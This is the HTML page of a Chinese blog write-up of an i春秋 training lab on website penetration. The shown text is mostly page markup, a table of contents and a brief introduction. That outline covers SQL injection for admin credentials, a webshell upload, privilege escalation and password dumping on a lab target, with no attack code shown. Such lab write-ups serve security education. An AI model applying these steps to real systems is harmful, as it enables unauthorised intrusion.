<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
  <link rel="mask-icon" href="/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"ciphersaw.me","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="0x00 前言本实验同样呈现了一次完整的模拟渗透流程，从最初获取网站管理员的账号密码，然后获得主站的 webshell，最后通过提权获得服务器系统的最高权限。 从实验手册上给出的工具提示可看出，本次渗透貌似更注重端口扫描与社会工程学的运用，其实大可不必被其限制了思路，当作一种参考方向即可，按照以往的渗透方法一样能达到目的。 简单介绍一下靶机环境：主站为秋潮个人摄影网站管理系统，主站下还有一个 Le">
<meta property="og:type" content="article">
<meta property="og:title" content="【i春秋】渗透测试入门 —— 网站综合渗透实验">
<meta property="og:url" content="https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/index.html">
<meta property="og:site_name" content="Secrypt Agency">
<meta property="og:description" content="0x00 前言本实验同样呈现了一次完整的模拟渗透流程，从最初获取网站管理员的账号密码，然后获得主站的 webshell，最后通过提权获得服务器系统的最高权限。 从实验手册上给出的工具提示可看出，本次渗透貌似更注重端口扫描与社会工程学的运用，其实大可不必被其限制了思路，当作一种参考方向即可，按照以往的渗透方法一样能达到目的。 简单介绍一下靶机环境：主站为秋潮个人摄影网站管理系统，主站下还有一个 Le">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/guide.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-info.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-injectable.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-verification.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-result.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-info.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-tables.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-columns.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-result.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-tables.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-true.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-false.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-points.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-admin.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-password.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-email-qq.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-manager.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-born.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dict.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/md5crack2.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-password.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-html-entity.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploading.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploaded.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-back.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-add-picture.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article-escape.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-setting-error.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload-path.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-default.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-picture.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-error.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan-uploaded.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-trojan.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-file-manager.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-conn-old.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-open-bear-mdb.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-bear-mdb.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-upload.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/systeminfo.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-user.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-localgroup.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-3389.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/mstsc.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/pwdump7.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/objectif.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server-admin.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-user.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-sa.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-error.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-user.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-linhai-password.png">
<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-admin-password.png">
<meta property="article:published_time" content="2018-04-15T02:19:43.000Z">
<meta property="article:modified_time" content="2021-09-30T15:23:18.890Z">
<meta property="article:author" content="Cipher Saw">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="i春秋">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="Exploit">
<meta property="article:tag" content="CMS">
<meta property="article:tag" content="SQLi">
<meta property="article:tag" content="Trojan">
<meta property="article:tag" content="Social Engineering">
<meta property="article:tag" content="ASP">
<meta property="article:tag" content="Database">
<meta property="article:tag" content="Privilege">
<meta property="article:tag" content="CMD">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/guide.png">


<link rel="canonical" href="https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/","path":"2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/","title":"【i春秋】渗透测试入门 —— 网站综合渗透实验"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【i春秋】渗透测试入门 —— 网站综合渗透实验 | Secrypt Agency</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Secrypt Agency</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome to a platform for network security artists.</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-users fa-fw"></i>Friends</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E3%80%8Clinhai%E3%80%8D%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-text">0x01 后台管理员「linhai」的密码是？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL 自动化注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%8E%E5%B0%8F%E5%AD%90%EF%BC%88Domian%EF%BC%89"><span class="nav-text">明小子（Domian）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMap"><span class="nav-text">SQLMap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL 手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1%EF%BC%9A%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="nav-text">Step 1：猜解表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2%EF%BC%9A%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0"><span class="nav-text">Step 2：猜解列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3%EF%BC%9A%E6%89%BE%E5%87%BA%E6%98%BE%E4%BD%8D%E7%82%B9"><span class="nav-text">Step 3：找出显位点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4%EF%BC%9A%E7%8C%9C%E8%A7%A3%E5%88%97%E5%90%8D"><span class="nav-text">Step 4：猜解列名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="nav-text">社工字典攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-LeadBBS-%E8%AE%BA%E5%9D%9B%E5%8F%AF%E5%90%A6%E8%8E%B7%E5%BE%97-webshell%EF%BC%9F"><span class="nav-text">0x02 LeadBBS 论坛可否获得 webshell？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93-sa-%E8%B4%A6%E5%8F%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-text">0x03 SQL Server 数据库 sa 账号的密码是？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Failure-1%EF%BC%9A%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87"><span class="nav-text">Failure 1：添加图片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Failure-2%EF%BC%9A%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86"><span class="nav-text">Failure 2：文章管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Success%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE-%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">Success：系统变量设置 + 备份数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E8%8E%B7%E5%8F%96-webshell"><span class="nav-text">菜刀连接获取 webshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-text">0x04 目标服务器系统的管理员密码是？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E6%96%87%E6%9C%AB%E5%BD%A9%E8%9B%8B"><span class="nav-text">0x05 文末彩蛋</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%9F%A5%E7%9C%8B-SSMS-%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="nav-text">直接查看 SSMS 账户的密码？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%8Clinhai%E3%80%8D%E7%9A%84%E8%AE%BA%E5%9D%9B%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="nav-text">「linhai」的论坛后台管理密码？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86-dtxy-asp-%E5%A4%8D%E5%88%B6%E5%88%B0%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E5%A4%B9%E5%86%8D%E4%B8%8B%E8%BD%BD"><span class="nav-text">将 dtxy.asp 复制到其他文件夹再下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E5%B0%86%E6%98%8E%E5%B0%8F%E5%AD%90%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E4%B8%8A%E4%BC%A0%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">直接将明小子注入工具上传至服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%AE%BA%E5%9D%9B%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="nav-text">获取论坛用户密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x06 小结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Cipher Saw"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Cipher Saw</p>
  <div class="site-description" itemprop="description">Not to be whom you don't want to be.</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">74</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ciphersaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ciphersaw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/CipherSaw" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;CipherSaw" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe-asia fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://ctf-wiki.github.io/ctf-wiki/" title="https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;" rel="noopener" target="_blank">CTF Wiki</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.owasp.org/index.php/Main_Page" title="https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">OWASP</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.pentest-standard.org/index.php/Main_Page" title="http:&#x2F;&#x2F;www.pentest-standard.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">Pentest Standard</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/ciphersaw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Cipher Saw">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Secrypt Agency">
      <meta itemprop="description" content="Not to be whom you don't want to be.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【i春秋】渗透测试入门 —— 网站综合渗透实验 | Secrypt Agency">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【i春秋】渗透测试入门 —— 网站综合渗透实验
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2018-04-15 10:19:43" itemprop="dateCreated datePublished" datetime="2018-04-15T10:19:43+08:00">2018-04-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-09-30 23:23:18" itemprop="dateModified" datetime="2021-09-30T23:23:18+08:00">2021-09-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/InfoSec/" itemprop="url" rel="index"><span itemprop="name">InfoSec</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/InfoSec/Pentest/" itemprop="url" rel="index"><span itemprop="name">Pentest</span></a>
        </span>
    </span>

  
    <span id="/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/" class="post-meta-item leancloud_visitors" data-flag-title="【i春秋】渗透测试入门 —— 网站综合渗透实验" title="Views">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span class="leancloud-visitors-count"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本实验同样呈现了一次完整的模拟渗透流程，从最初获取网站管理员的账号密码，然后获得主站的 webshell，最后通过提权获得服务器系统的最高权限。</p>
<p>从实验手册上给出的工具提示可看出，本次渗透貌似更注重<strong>端口扫描</strong>与<strong>社会工程学的运用</strong>，其实大可不必被其限制了思路，当作一种参考方向即可，按照以往的渗透方法一样能达到目的。</p>
